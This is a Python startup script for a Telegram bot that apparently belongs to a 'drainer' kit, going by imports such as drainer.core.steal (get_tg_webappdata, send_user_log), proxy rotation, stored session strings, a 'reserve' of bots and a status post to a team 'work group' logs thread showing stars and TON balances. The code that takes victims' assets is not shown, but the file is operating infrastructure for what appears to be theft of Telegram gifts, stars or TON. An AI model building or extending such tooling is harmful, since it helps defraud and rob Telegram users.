import paths

from aiogram import Bot, Dispatcher
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import FSInputFile

from pyrogram import Client

from pathlib import Path
import asyncio
import logging
import json

import os

import config
import database
from drainer.core.proxy import get_active_proxy
from drainer.core import hybr1d_shared
from drainer.core.steal import get_tg_webappdata, send_user_log
from drainer.core.functional import mutate_text
from drainer.core.tonnel_api import get_balance_info

from handlers import router as main_router

import psutil
import platform
import random

proxy = get_active_proxy()
actual_proxy = proxy[1]
proxy = proxy[0]["ru"]

absolute_path = paths.TEAM_DIR
BASE_DIR = Path(__file__).resolve().parent

api_id = config.API_ID
api_hash = config.API_HASH

star_session = Client(f"{absolute_path}/star_session", api_id, api_hash, proxy=proxy)

bot = Bot(token=config.BOT_TOKEN)

dp = Dispatcher()

storage = MemoryStorage()


async def start_log():
    api_id = config.API_ID
    api_hash = config.API_HASH

    star_session_name = random.choices("abcdefghijklmnopqrstuvwxyz0123456789" + "abcdefghijklmnopqrstuvwxyz0123456789".upper(), k=16)
    star_session = Client(star_session_name, api_id=api_id, api_hash=api_hash, session_string=config.STAR_SESSION_STRING)
    
    try:
        await star_session.connect()
    except Exception as e:
        if "database is locked" in str(e).lower():
            star_session.storage.conn.close()
            await asyncio.sleep(1)
            await star_session.connect()

    await asyncio.sleep(1)

    try:
        stars = await star_session.get_stars_balance()
    except:
        stars = "Не удалось подключиться"

    warn_text = "Hybr1dAPI: ✅"

    if type(stars) == int:
        if stars < 100:
            warn_text = "<b>Мало звёзд на автозакиде — пополни</b>"

    with open(f"{absolute_path}/storage/reserve.json", "r+", encoding="utf-8") as f:
        data = json.load(f)
        reserve = data.get("reserve", [])

    reserve_text = f"<tg-emoji emoji-id='5278540791336165644'>🫰</tg-emoji> Резерв ботов: <code>{len(reserve)}</code>"

    cpu_usage = psutil.cpu_percent(interval=1)
    memory = psutil.virtual_memory()
    memory_usage = memory.percent
    system_info = platform.system() + " " + platform.release()
    
    init_data = hybr1d_shared.read_cached_init_data()
    if not init_data:
        async with hybr1d_shared.hybr1d_client_context(
            api_id, api_hash, config.HYBR1D_SESSION_STRING
        ) as hybr1d_app:
            init_data = await get_tg_webappdata(
                hybr1d_app, "@Tonnel_Network_bot"
            )

    offer_balance = get_balance_info(init_data)

    msg = (
        f"<b><tg-emoji emoji-id='5039660044682004366'>🫰</tg-emoji> Бот поднялся</b>\n\n"
        f"<blockquote><tg-emoji emoji-id='5206476089127372379'>🫰</tg-emoji> Автозакид: <code>{stars}</code>\n"
        f"<tg-emoji emoji-id='5193179982775476271'>🫰</tg-emoji> Баланс Офферов: <code>{offer_balance:.2f} TON</code>\n"
        f"{reserve_text}</blockquote>\n"
        f"<b><tg-emoji emoji-id='5276381204470329471'>🫰</tg-emoji> Хост</b>\n<blockquote><code>{system_info}</code>\n"
        f"CPU <code>{cpu_usage}%</code> · RAM <code>{memory_usage}%</code></blockquote>\n"
        f"<b>{warn_text}</b>\n"
        f"<b>made with <tg-emoji emoji-id='5039880333554616347'>🫰</tg-emoji> by @xv_Doshik</b>"
    )
    await bot.send_message(
        chat_id=config.WORK_GROUP_ID,
        message_thread_id=config.LOGS_THREAD_ID,
        text=msg,
        parse_mode="HTML",
    )

    try:
        await star_session.disconnect()
    except:
        pass


async def main():
    print("Made with love by @xv_Doshik")

    dp.include_router(main_router)

    me = await bot.get_me()
    bot_id = me.id

    photos = await bot.get_user_profile_photos(user_id=bot_id, limit=1)


    try:
        if photos.total_count > 0:
            photo = photos.photos[0][-1]
            file = await bot.get_file(photo.file_id)

            await bot.download_file(
                file.file_path, destination=f"{absolute_path}/avatar.png"
            )
    except:
        pass

    try:
        await start_log()
    except Exception:
        logging.exception("start_log")
    await dp.start_polling(bot)


if __name__ == "__main__":
    database.init_databases()
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())
